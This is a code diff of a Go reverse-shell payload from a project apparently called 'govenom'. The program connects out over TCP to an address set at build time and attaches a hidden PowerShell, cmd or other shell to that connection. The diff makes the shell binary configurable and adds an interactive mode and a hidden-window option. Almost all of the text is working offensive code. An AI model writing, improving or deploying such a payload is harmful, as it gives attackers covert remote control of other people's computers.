@@ -4,42 +4,33 @@ import (
 	"fmt"
 	"govenom/debuglog"
 	"net"
-	"os"
 	"os/exec"
-	"syscall"
 )
 
 var (
 	// set during compilation/linking via -X ldflag
-	address  string
-	debugCfg string
+	address      string
+	debugCfg     string
+	noWindowsGui string
+	shellBinary  string
 )
 
-func findShellBinary() (string, error) {
-	windir := os.Getenv("windir")
-	if windir == "" {
-		windir = "C:\\Windows"
-	}
-
-	windowsShellBinaryPaths := []string{
-		fmt.Sprintf("%s\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", windir), // PS x64
-		fmt.Sprintf("%s\\syswow64\\WindowsPowerShell\v1.0\\powershell.exe", windir),  // PS x32
-		fmt.Sprintf("%s\\system32\\cmd.exe", windir),                                 // cmd
-	}
-
-	for _, binaryPath := range windowsShellBinaryPaths {
-		if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
+func determineShellBinary(candidates []string) (string, error) {
+	candidates = append([]string{shellBinary}, candidates...)
+	for _, candidate := range candidates {
+		binary, err := exec.LookPath(candidate)
+		if err != nil {
 			continue
 		}
-		return binaryPath, nil
+		return binary, nil
 	}
 	return "", fmt.Errorf("could not find any existing shell binary")
 }
 
 func attachShell(binaryPath string, con net.Conn) error {
 	var cmd *exec.Cmd
-	cmd = exec.Command(binaryPath)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd = exec.Command(binaryPath, "-i")
+	cmd.SysProcAttr = getSysProcAttr()
 	cmd.Stdin = con
 	cmd.Stdout = con
 	cmd.Stderr = con
@@ -60,7 +51,7 @@ func main() {
 
 	con, err := net.Dial("tcp", address)
 	if err != nil {
-		log.Printf(err.Error())
+		log.Fatal(err)
 	}
 
 	log.AddExfiltrator(con)
@@ -71,7 +62,7 @@ func main() {
 		}
 	}
 
-	binaryPath, err := findShellBinary()
+	binaryPath, err := determineShellBinary(getShellBinaries())
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -82,4 +73,5 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+	log.Println("Shell terminated")
 }
